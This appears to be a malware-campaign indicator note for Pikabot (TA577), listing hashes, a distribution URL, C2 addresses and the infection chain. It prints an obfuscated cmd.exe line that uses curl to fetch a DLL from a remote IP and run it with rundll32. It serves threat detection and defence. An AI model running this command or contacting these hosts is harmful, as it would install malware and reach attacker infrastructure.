@@ -1,0 +1,48 @@
+17.10.2023 | Pikabot | TA577 | 
+
+*************************************************
+
+.url https://shubhshadi.co.in/qmun/
+.zip 09636b8b2245f94c3117969148d4d5edae984f7128e38bead3f6a7791c85b440
+.zip 9a44adc1b48de78f1f7d977cff79e47f2e61c61a5d6a96c20f3ae973193670e2
+.dll b6e8910fb9b3bb1fcddefd35ff0ed8624930d30d6977e11808c8330415685a62
+
+*************************************************
+
+zip > lnk > curl > dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\opt-13.js
+
+cmd.exe /c TR || eChO TR & PIng TR || curl http://116.203.159.191/yAGmH/Exped -o %tMp%\TR.log & PIng -n 4 TR || RUNdll32 %Tmp%\TR.log, CrashForExceptionExportThunk & EXIT FlTRZ=jbnIYyZJ
+
+PIng TR 
+
+PIng -n 4 TR
+
+RUNdll32 C:\Users\Admin\AppData\Local\Temp\TR.log, CrashForExceptionExportThunk
+
+*************************************************
+
+distro url
+
+https://shubhshadi.co.in/qmun/
+
+*************************************************
+
+.dll distro
+
+http://116.203.159.191/yAGmH/Exped
+
+*************************************************
+
+c2'
+
+https://185.106.94.174:5000/CouncillaryConurbation/ChPfsiBdKMzP4y?EpisiotomiesComendite=GovernorAntherozoidal&antipyics=CouncillaryConurbation&isocymene=Ony
+
+185.106.94.174:5000
+185.106.94.177:13721
+80.85.140.43:9785
+185.106.94.152:13720
+85.106.94.167:5631 
+80.85.140.152:5938
+
